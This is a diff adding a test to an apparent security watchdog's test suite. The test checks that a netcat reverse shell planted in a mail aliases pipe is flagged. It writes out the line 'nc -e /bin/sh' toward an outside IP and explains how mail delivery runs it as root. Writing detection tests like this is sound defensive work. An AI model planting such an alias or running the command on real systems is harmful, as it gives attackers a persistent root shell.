@@ -283,3 +283,18 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in aliases pipe: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to many other watchdog's nc reverse-shell variant
+    # INVARIANTs across the brain. Lock the netcat axis on the
+    # mail-delivery-triggered root-exec persistence surface
+    # (T1546 — MTA delivers mail to alias pipe-target by exec'ing
+    # the command AS ROOT on every matching message; attacker
+    # sends self-addressed mail to trigger planted nc).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'evil: |nc -e /bin/sh 1.1.1.1 4444\n' > "${ALIASES}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
